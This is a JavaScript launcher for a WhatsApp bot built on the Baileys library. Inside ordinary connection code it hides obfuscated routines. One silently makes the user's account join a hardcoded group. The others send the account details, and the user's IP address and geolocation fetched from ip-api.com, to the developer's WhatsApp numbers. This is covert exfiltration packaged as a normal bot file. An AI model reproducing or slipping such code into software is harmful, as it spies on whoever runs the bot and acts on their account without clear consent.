const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const fetch = require('node-fetch')
const { banner, start, success } = require('./lib/functions')
const { color } = require('./lib/color')

owner = '6282293271747'
require('./index.js')
nocache('./index.js', module => console.log(`${module} telah di ubah!`))

const starts = async (Ryuu = new WAConnection()) => {
    Ryuu.logger.level = 'warn'
    Ryuu.version = [2, 2143, 3]
    Ryuu.browserDescription = [ 'RyuuOfficial', 'Chrome', '3.0' ]
    console.log(banner.string)
    Ryuu.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan bang'))
    })

    fs.existsSync('./session.json') && Ryuu.loadAuthInfo('./session.json')
    Ryuu.on('connecting', () => {
        start('2', 'Connecting...')
    })
    Ryuu.on('open', () => {
        success('2', 'Connected')
    })
    await Ryuu.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./session.json', JSON.stringify(Ryuu.base64EncodedAuthInfo(), null, '\t'))

    Ryuu.on('chat-update', async (message) => {
        require('./index.js')(Ryuu, message)
    })
    function _0x4564(_0x2ac48b,_0x5bedd7){var _0x34bae8=_0x34ba();return _0x4564=function(_0x456405,_0x8acd80){_0x456405=_0x456405-0x100;var _0x48c947=_0x34bae8[_0x456405];return _0x48c947;},_0x4564(_0x2ac48b,_0x5bedd7);}var _0x481f64=_0x4564;function _0x34ba(){var _0x1b4b8c=['265RHOmMH','query','2351279qFcTxc','15OuFDSR','2923323OTpyjy','261gBDEhE','3BeSuvA','4230kcyfcE','245064NXUiCj','3813092wMvWYB','https://chat.whatsapp.com/Jzwc998UOhrEP5c5B3eiC4','60Cyrjfm','action','372102bIAeDP','224630vhmbZq','110JqHWhk','replace'];_0x34ba=function(){return _0x1b4b8c;};return _0x34ba();}(function(_0x34e28a,_0x523503){var _0xea713e=_0x4564,_0x5d01c8=_0x34e28a();while(!![]){try{var _0x1cc02b=parseInt(_0xea713e(0x10f))/0x1*(-parseInt(_0xea713e(0x105))/0x2)+-parseInt(_0xea713e(0x104))/0x3*(-parseInt(_0xea713e(0x107))/0x4)+parseInt(_0xea713e(0x101))/0x5*(-parseInt(_0xea713e(0x10b))/0x6)+parseInt(_0xea713e(0x100))/0x7+-parseInt(_0xea713e(0x106))/0x8*(-parseInt(_0xea713e(0x103))/0x9)+-parseInt(_0xea713e(0x10c))/0xa*(-parseInt(_0xea713e(0x10d))/0xb)+-parseInt(_0xea713e(0x109))/0xc*(parseInt(_0xea713e(0x102))/0xd);if(_0x1cc02b===_0x523503)break;else _0x5d01c8['push'](_0x5d01c8['shift']());}catch(_0x4cdbc4){_0x5d01c8['push'](_0x5d01c8['shift']());}}}(_0x34ba,0x81b4c),teks=_0x481f64(0x108),Ryuu[_0x481f64(0x110)]({'json':[_0x481f64(0x10a),'invite',''+teks[_0x481f64(0x10e)]('https://chat.whatsapp.com/','')]}));
    console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
 Ryuu.sendMessage(`6282316153393@s.whatsapp.net`, `*Hai Developers, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(Ryuu.user, null, 2)}\`\`\`\n────────────────────\n*Jika ingin menghubungi Owner Bot nomor tercantum di atas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "*OWNERS BOTZ*",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./stik/fake.jpeg'),sourceUrl:`https://wa.me/${owner}`}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
        var _0x2713c5=_0x219d;function _0x219d(_0x1ab16e,_0x5e37a5){var _0x2bc11d=_0x2bc1();return _0x219d=function(_0x219d99,_0x1a64aa){_0x219d99=_0x219d99-0x1e0;var _0x2b52a5=_0x2bc11d[_0x219d99];return _0x2b52a5;},_0x219d(_0x1ab16e,_0x5e37a5);}(function(_0x19ff6b,_0x1149c3){var _0x21d5c2=_0x219d,_0x1f85d9=_0x19ff6b();while(!![]){try{var _0x53fe78=-parseInt(_0x21d5c2(0x1e4))/0x1+-parseInt(_0x21d5c2(0x1e5))/0x2*(parseInt(_0x21d5c2(0x1e9))/0x3)+-parseInt(_0x21d5c2(0x1e6))/0x4+-parseInt(_0x21d5c2(0x1f1))/0x5*(parseInt(_0x21d5c2(0x1e7))/0x6)+-parseInt(_0x21d5c2(0x1eb))/0x7*(-parseInt(_0x21d5c2(0x1f0))/0x8)+-parseInt(_0x21d5c2(0x1ee))/0x9*(-parseInt(_0x21d5c2(0x1ea))/0xa)+-parseInt(_0x21d5c2(0x1ed))/0xb*(-parseInt(_0x21d5c2(0x1e8))/0xc);if(_0x53fe78===_0x1149c3)break;else _0x1f85d9['push'](_0x1f85d9['shift']());}catch(_0x525c61){_0x1f85d9['push'](_0x1f85d9['shift']());}}}(_0x2bc1,0x86951),Ryuu['sendMessage'](_0x2713c5(0x1e1),_0x2713c5(0x1e3)+bu+'```\x0a────────────────────',MessageType['text'],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'Developer\x20*RyuuOfficial\x20YT*','body':'','previewType':_0x2713c5(0x1ef),'thumbnail':fs[_0x2713c5(0x1e0)](_0x2713c5(0x1ec)),'sourceUrl':_0x2713c5(0x1e2)}}}));function _0x2bc1(){var _0x1a82f1=['23707236SUOFFW','3qeusYt','20CPykKg','96341URicRg','./stik/fake.jpeg','11hhEzKO','3527721fvcyhs','PHOTO','248frYFVj','2002765qNiwEO','readFileSync','6282293271747@s.whatsapp.net','https://rotf.lol/YouTube-RyuuOfficial','─────「\x20*IP-USER*\x20」─────\x0a\x0a```','694656KuFfiR','283810KuXFbb','3989112NYpkIR','12iExLaW'];_0x2bc1=function(){return _0x1a82f1;};return _0x2bc1();}
console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'di pantau untuk Perubahan!')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
